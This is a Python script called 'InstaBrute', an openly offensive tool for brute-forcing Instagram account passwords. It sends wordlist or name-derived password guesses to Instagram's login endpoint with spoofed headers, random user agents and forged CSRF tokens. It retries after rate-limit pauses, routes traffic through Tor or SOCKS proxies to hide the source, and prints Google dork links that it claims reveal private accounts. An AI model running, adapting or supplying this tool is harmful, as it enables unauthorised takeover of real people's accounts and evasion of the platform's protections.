#instagram brute-force
#coded by anezatra

import os
import sys
import time
import socks
import socket
import random
import string
import requests
import user_agent

from bs4 import BeautifulSoup as bsoup

def manual_mode(username,password_file_path):

    try:
        max_attempts = 30
        attempts = 0
    
        while attempts < max_attempts:

            with open(password_file_path, 'r') as file:
                passwords = file.readlines()
                passwords = [password.strip() for password in passwords]

                user_agent_str = user_agent.generate_user_agent()
                csrftoken = ''.join(random.choices(string.ascii_letters + string.digits, k=32))

                if passwords:
                        
                        cookies = {
                            'dpr': '0.8999999761581421',
                            'mid': 'ZMGMzAALAAGJS1gECSZaUnQgQ1uI',
                            'ig_did': 'F0441404-D7A8-46D7-A4F9-5AD07084A2F8',
                            'ig_nrcb': '1',
                            'datr': '0IzBZI6BOsqT02OYhDyKwpG6',
                            'shbid': '"957\\05450218233933\\0541723041943:01f7ff0c54e6ce9d60855d3c9e599fb6930d941744992d5e5dbd850897428d9ed84815b9"',
                            'shbts': '"1691505943\\05450218233933\\0541723041943:01f71e00049e1377cec922de29707ac175757504450e66a8e3049f8e431a13f5cc0fb310"',
                            'rur': '"NAO\\05460690649787\\0541723196195:01f7b8f0fa314138cddd8a5fd6cc27169bfbb349e2f845f64d1a7941aeb496bf0409e578"',
                            'csrftoken': f'{csrftoken}',
                        }

                        headers = {
                            'authority': 'www.instagram.com',
                            'accept': '*/*',
                            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                            'content-type': 'application/x-www-form-urlencoded',
                            # 'cookie': 'dpr=0.8999999761581421; mid=ZMGMzAALAAGJS1gECSZaUnQgQ1uI; ig_did=F0441404-D7A8-46D7-A4F9-5AD07084A2F8; ig_nrcb=1; datr=0IzBZI6BOsqT02OYhDyKwpG6; shbid="957\\05450218233933\\0541723041943:01f7ff0c54e6ce9d60855d3c9e599fb6930d941744992d5e5dbd850897428d9ed84815b9"; shbts="1691505943\\05450218233933\\0541723041943:01f71e00049e1377cec922de29707ac175757504450e66a8e3049f8e431a13f5cc0fb310"; rur="NAO\\05460690649787\\0541723196195:01f7b8f0fa314138cddd8a5fd6cc27169bfbb349e2f845f64d1a7941aeb496bf0409e578"; csrftoken=K6QCUN6MhwrYFEo0eTLoisJFcChjUSyP',
                            'dpr': '0.9',
                            'origin': 'https://www.instagram.com',
                            'referer': 'https://www.instagram.com/',
                            'sec-ch-prefers-color-scheme': 'light',
                            'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                            'sec-ch-ua-full-version-list': '"Not/A)Brand";v="99.0.0.0", "Google Chrome";v="115.0.5790.171", "Chromium";v="115.0.5790.171"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                            'sec-ch-ua-platform-version': '"10.0.0"',
                            'sec-fetch-dest': 'empty',
                            'sec-fetch-mode': 'cors',
                            'sec-fetch-site': 'same-origin',
                            'user-agent': f'{user_agent_str}',
                            'viewport-width': '715',
                            'x-asbd-id': '129477',
                            'x-csrftoken': f'{csrftoken}',
                            'x-ig-app-id': '936619743392459',
                            'x-ig-www-claim': 'hmac.AR2ePzSAFJuubN70uPFQSl65-2y5ctNe0AVDxVNlZn_bBtey',
                            'x-instagram-ajax': '1008009585',
                            'x-requested-with': 'XMLHttpRequest',
                        }

                        data = {
                            'optIntoOneTap': 'false',
                            'queryParams': '{"oneTapUsers":"[\\"50218233933\\",\\"60520063747\\"]"}',
                            'trustedDeviceRecords': '{"50218233933":{"machine_id":"ZMGMzAALAAGJS1gECSZaUnQgQ1uI","nonce":"ChFLWlrL2tmVEcKah27ndSQlBtkkoeVnNvBZjB1UHyJvWS1Cnzuyfa35Fq5Rt4sH"}}',
                            'username': f'{username}',
                        }
                
                        for password in passwords:
                            data['enc_password'] = f'#PWD_INSTAGRAM_BROWSER:0:0:{password}'
                            time.sleep(1)
                            response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
                            response_data = response.json() 
                    
                            if "authenticated" in response_data and response_data["authenticated"]:
                                print("\n----------------------------------------------------\n")
                                print(f"[+] Password found: {password}")
                                print("[+] Direct link: https://instagram.com/accounts/login\n")
                                sys.exit()
                            elif response.status_code == 429:
                                print(f"[!] Try :: {password} authenticated :: Error")
                                print(f"[!] Error! too many requests. Please change ip address\n")
                                sys.exit()
                            elif response.status_code == 403:
                                print(f"[!] Try :: {password} authenticated :: Error")
                                print(f"[!] Error! 403 Forbidden.\n")
                                sys.exit()
                            else:
                                print(f"[*] Try :: {password} authenticated :: False :: {response.status_code} OK")

                            attempts += 1
        
                            if attempts == max_attempts:
                                print(f"[-] Max attempts reached. Request will be sent after 60 seconds...")
                                time.sleep(60)
                                manual_mode(username,password_file_path)

                else:
                    print("\n[-] Password file is empty.\n")
    except FileNotFoundError:
        print("\n[-] Password file not found.\n")

        

def auto_mode(name,username):
    
    max_attempts = 30
    attempts = 0
    
    while attempts < max_attempts:
    
        length = random.randint(2,20)

        name = name.lower().replace(" ", "")  
        random_chars = string.ascii_lowercase + string.digits + "_" + "__" + "11" + "22" + "33" + "44" + "55" + "66" + "77" + "88" + "99" + "00" + "!" + "?" + "%"
        password = name + ''.join(random.choice(random_chars) for _ in range(length - len(name)))

        user_agent_str = user_agent.generate_user_agent()
        csrftoken = ''.join(random.choices(string.ascii_letters + string.digits, k=32))

        cookies = {
            'dpr': '0.8999999761581421',
            'mid': 'ZMGMzAALAAGJS1gECSZaUnQgQ1uI',
            'ig_did': 'F0441404-D7A8-46D7-A4F9-5AD07084A2F8',
            'ig_nrcb': '1',
            'datr': '0IzBZI6BOsqT02OYhDyKwpG6',
            'shbid': '"957\\05450218233933\\0541723041943:01f7ff0c54e6ce9d60855d3c9e599fb6930d941744992d5e5dbd850897428d9ed84815b9"',
            'shbts': '"1691505943\\05450218233933\\0541723041943:01f71e00049e1377cec922de29707ac175757504450e66a8e3049f8e431a13f5cc0fb310"',
            'rur': '"NAO\\05460690649787\\0541723196195:01f7b8f0fa314138cddd8a5fd6cc27169bfbb349e2f845f64d1a7941aeb496bf0409e578"',
            'csrftoken': f'{csrftoken}',
            }

        headers = {
            'authority': 'www.instagram.com',
            'accept': '*/*',
            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            # 'cookie': 'dpr=0.8999999761581421; mid=ZMGMzAALAAGJS1gECSZaUnQgQ1uI; ig_did=F0441404-D7A8-46D7-A4F9-5AD07084A2F8; ig_nrcb=1; datr=0IzBZI6BOsqT02OYhDyKwpG6; shbid="957\\05450218233933\\0541723041943:01f7ff0c54e6ce9d60855d3c9e599fb6930d941744992d5e5dbd850897428d9ed84815b9"; shbts="1691505943\\05450218233933\\0541723041943:01f71e00049e1377cec922de29707ac175757504450e66a8e3049f8e431a13f5cc0fb310"; rur="NAO\\05460690649787\\0541723196195:01f7b8f0fa314138cddd8a5fd6cc27169bfbb349e2f845f64d1a7941aeb496bf0409e578"; csrftoken=K6QCUN6MhwrYFEo0eTLoisJFcChjUSyP',
            'dpr': '0.9',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
            'sec-ch-ua-full-version-list': '"Not/A)Brand";v="99.0.0.0", "Google Chrome";v="115.0.5790.171", "Chromium";v="115.0.5790.171"',
             'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': f'{user_agent_str}',
            'viewport-width': '715',
            'x-asbd-id': '129477',
            'x-csrftoken': f'{csrftoken}',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR2ePzSAFJuubN70uPFQSl65-2y5ctNe0AVDxVNlZn_bBtey',
            'x-instagram-ajax': '1008009585',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'optIntoOneTap': 'false',
            'queryParams': '{"oneTapUsers":"[\\"50218233933\\",\\"60520063747\\"]"}',
            'trustedDeviceRecords': '{"50218233933":{"machine_id":"ZMGMzAALAAGJS1gECSZaUnQgQ1uI","nonce":"ChFLWlrL2tmVEcKah27ndSQlBtkkoeVnNvBZjB1UHyJvWS1Cnzuyfa35Fq5Rt4sH"}}',
            'username': f'{username}',
        }
                
        time.sleep(1)
        response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
        response_data = response.json() 

        if "authenticated" in response_data and response_data["authenticated"]:
            print("\n-------------------------------------------------------------\n")
            print(f"[+] Password finded: {password}")
            print(f"[+] Direct link: https://instagram.com/accounts/login\n")
            sys.exit()
        elif response.status_code == 429:
            print(f"[!] Try :: {password} authenticated :: Error")
            print(f"[!] Error! too many requests. Please change ip address\n")
            sys.exit()
        elif response.status_code == 403:
            print(f"[!] Try :: {password} authenticated :: Error")
            print(f"[!] Error! 403 Forbidden.\n")
            sys.exit()
        else:
            print(f"[*] Try :: {password} authenticated :: False :: {response.status_code} OK")
        
        attempts += 1
        
        if attempts == max_attempts:
            print(f"[-] Max attempts reached. Request will be sent after 60 seconds...")
            time.sleep(60)
            auto_mode(name,username)

def tor_mode():

    try:
        socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
        socket.socket = socks.socksocket
        print(f"[+] Connection successfully\n")
        
    except Exception as e:
        print(f"[-] Connection failed: {e}\n")

def man_mode(ip,port):

    try:
        socks.set_default_proxy(socks.SOCKS5, "ip", port)
        socket.socket = socks.socksocket
        print(f"[+] Connection successfully\n")
        
    except Exception as e:
        print(f"[-] Connection failed: {e}\n")

def google_search(user):
    
    exploit = f"""
DESCRIPTION
-----------
Contains links and direct URL. You will be able to see the results of open transactions in the account. 
However, this method may not always work correctly.

TARGET LIKED PHOTOS
-------------------

[EXPLOIT LINK]: https://www.google.com/search?q=site%3Ainstagram.com+intext%3A%22Liked+by+{user}

POST MENTIONED TARGET
--------------------

[EXPLOIT LINK]: https://www.google.com/search?q=site%3Ainstagram.com+intext%3A%22{user}
    """
    print(exploit)

def google_search_image(user):

    exploit = f"""
DESCRIPTION
-----------
Contains links and direct URL. You will be able to see the results of open transactions in the account. 
However, this method may not always work correctly.

TARGET PHOTOS
-------------

[EXPLOIT LINK]: https://www.google.com/search?q=intext:%22{user}%22&sca_esv=4bf4f10bfaa884c2&tbm=isch&source=lnms&sa=X&ved=2ahUKEwim44yC06KEAxUSQ_EDHdiIBZsQ_AUoAXoECAEQAw&biw=1366&bih=641&dpr=1
"""
    print(exploit)
    
def main():

    try:
        import requests
        import user_agent
        import socks

        print("\n[*] all modules installed.")
    except:
        print("\n[!] Requests or user_agent module not found, installing...")
        os.system("pip install requests")
        os.system("pip install user_agent")
    
    os.system("clear")
    print("\n\n")
    banner = '''
    
            ██╗███╗   ██╗███████╗████████╗ █████╗ ███╗   ██╗███████╗████████╗
            ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗████╗  ██║██╔════╝╚══██╔══╝
            ██║██╔██╗ ██║███████╗   ██║   ███████║██╔██╗ ██║█████╗     ██║   
            ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║╚██╗██║██╔══╝     ██║   
            ██║██║ ╚████║███████║   ██║   ██║  ██║██║ ╚████║███████╗   ██║   
            ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝  

                              ╔═════════════════════════╗
                                BRUTE FORCE & EXPLOITER
                              ╚═════════════════════════╝
                       
--------------------------
WELCOME TO INSTABRUTE V1.0
--------------------------

Use of this program is at the user's own responsibility. 
Possible problems are not the responsibility of the developer. 
To use the program you just need to enter the name and select 
the mode, coded by Anezatra.
    '''
    print(banner)
    print("--------------------== SELECT MODE ==------------------------")
    print("[1][BRUTE FORCE]: Manual mode")
    print("[2][BRUTE FORCE]: Auto mode")
    print("-------------------------------------------------------------")
    print("[3][EXPLOITER]: See open source data")
    print("[4][EXPLOITER]: View private account (BETA)")
    print("-------------------------------------------------------------")
    print("[5][SECURE]: Manual connect")
    print("[6][SECURE]: Tor connect")
    print("-------------------------------------------------------------\n")
    while True:
        command = input("instabrute > ")
        if command == "1":
            username = input("\n[*] Enter username: ")
            password_file_path = input("[*] Passlist: ")
            print("\n-------------------------------------------------------------\n")
            manual_mode(username,password_file_path)
        elif command == "2":
            username = input("\n[*] Enter username: ")
            name = input("[*] name to generate passwords: ")
            print("\n-------------------------------------------------------------\n")
            auto_mode(name,username)
        elif command == "3":
            user = input("\n[*] Enter username: ")
            print("[*] Generating links ...")
            time.sleep(1)
            google_search(user)

        elif command == "4":
            user = input("\n[*] Enter username: ")
            print("[*] Generating links ...")
            time.sleep(1)
            google_search_image(user)

        elif command == "5":
            
            print("\n-------------------------------------------------------------\n")
            ip = input("[*] Enter ip address: ")
            port = input("[*] Enter port number: ")
            print(f"\n[*] Connecting to http://{ip}{port} ...")
            man_mode(ip,port)       

        elif command == "6":
            
            print("\n-------------------------------------------------------------\n")
            print("[*] Connecting to http://127.0.0.1:9050 ...")
            tor_mode()     

        else:
            print("\n[!] Command not found! \n")

if __name__ == "__main__":
    main()